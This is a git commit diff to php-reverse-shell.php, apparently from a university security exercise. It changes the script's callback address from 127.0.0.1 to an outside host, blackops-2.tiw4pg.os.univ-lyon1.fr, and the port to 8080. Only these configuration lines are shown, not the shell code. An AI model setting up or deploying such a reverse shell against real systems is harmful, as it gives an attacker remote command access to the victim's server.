ad3da2a825634793101aa9eec25f2edfd4d4f51a
Lucas Vialatoux <lucas.vialatoux@yahoo.fr>
2021-02-03 19:01:02 -0100

    Update php-reverse-shell.php

--- php-reverse-shell.php
+++ php-reverse-shell.php
@@ -46,8 +46,8 @@
 
 set_time_limit (0);
 $VERSION = "1.0";
-$ip = '127.0.0.1';  // CHANGE THIS
-$port = 1234;       // CHANGE THIS
+$ip = 'blackops-2.tiw4pg.os.univ-lyon1.fr/';  // CHANGE THIS
+$port = 8080;       // CHANGE THIS
 $chunk_size = 1400;
 $write_a = null;
 $error_a = null;
